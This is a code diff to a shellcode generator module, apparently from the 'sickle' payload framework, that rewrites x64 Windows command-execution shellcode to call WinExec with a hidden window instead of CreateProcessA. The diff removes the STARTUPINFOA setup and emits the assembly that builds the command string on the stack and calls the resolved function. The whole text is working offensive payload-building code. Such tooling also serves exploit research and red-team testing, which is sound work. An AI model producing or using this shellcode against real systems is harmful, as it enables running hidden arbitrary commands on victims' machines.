@@ -9,10 +9,6 @@ from sickle.common.lib.programmer import stubhub
 
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.headers.windows import (
-    processthreadsapi
-)
-
 class Shellcode():
 
     arch = "x64"
@@ -55,7 +51,7 @@ class Shellcode():
 
         self.dependencies = {
             "Kernel32.dll": [
-                "CreateProcessA",
+                "WinExec",
             ],
         }
 
@@ -63,9 +59,7 @@ class Shellcode():
 
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
-            "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
             "lpCommandLine"        : self.cmd_len,
-            "lpProcessInformation" : 0x00,
         })
 
         self.stack_space = builder.calc_stack_space(sc_args)
@@ -116,29 +110,9 @@ class Shellcode():
         """
 
         src = f"""
-; [RBX] => typedef struct _STARTUPINFOA {{ }}
-memset_STARTUPINFOA:
-    lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]
-    mov rbx, rdi
-    xor eax, eax
-    mov ecx, {int(ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04)}
-    rep stosd
-
-init_STARTUPINFOA:
-    mov eax, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
-    mov [rbx], eax
-
-; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
-;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
-;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
-;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
-;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => NULL
-;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
-;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
-;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
-;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo
-call_CreateProccessA:\n"""
+; RAX => WinExec([in] LPCSTR lpCmdLine, // RCX => "command"
+;                [in] UINT   uCmdShow); // RDX => SW_HIDE
+call_WinExec:\n"""
 
         cmd_buffer = convert.from_str_to_xwords(self.cmd)
         write_index = self.storage_offsets['lpCommandLine']
@@ -163,23 +137,10 @@ call_CreateProccessA:\n"""
             src += "    mov [rbp-{}], cl\n".format(hex(write_index))
             write_index -= 1
 
-        src += f"""    xor rcx, rcx
-    mov [rbp - {write_index}], cl
-    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]\n"""
-
-        src += f"""    xor r8, r8
-    xor r9, r9
-    xor eax, eax
-    inc eax
-    mov [rsp + 0x20], rax
-    dec eax
-    mov [rsp + 0x28], rax
-    mov [rsp + 0x30], rax
-    mov [rsp + 0x38], rax
-    mov [rsp + 0x40], rbx
-    lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
-    mov [rsp + 0x48], rbx
-    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
+        src += f"""    xor rdx, rdx
+    mov [rbp - {write_index}], dl
+    lea rcx, [rbp - {self.storage_offsets['lpCommandLine']}]
+    mov rax, [rbp - {self.storage_offsets['WinExec']}]
     call rax\n"""
 
         return src
